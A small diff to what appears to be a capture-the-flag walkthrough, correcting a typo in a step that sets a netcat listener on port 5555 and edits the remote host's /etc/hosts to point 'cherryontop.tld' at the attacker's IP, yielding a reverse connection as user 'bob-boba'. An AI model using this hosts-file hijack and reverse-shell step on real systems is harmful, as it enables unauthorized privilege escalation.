@@ -171,7 +171,7 @@ Then we set a listener with netcat :
 listening on [any] 5555 ...
 ```
 
-Then we modify on the remote host /etc/hosts file and add the following entrance :
+Then we modify the remote host /etc/hosts file and add the following entrance :
 YOUR_IP cherryontop.tld
 
 After a few seconds you will receive a connection on our netcat listener congrats we have escalated to bob-boba :
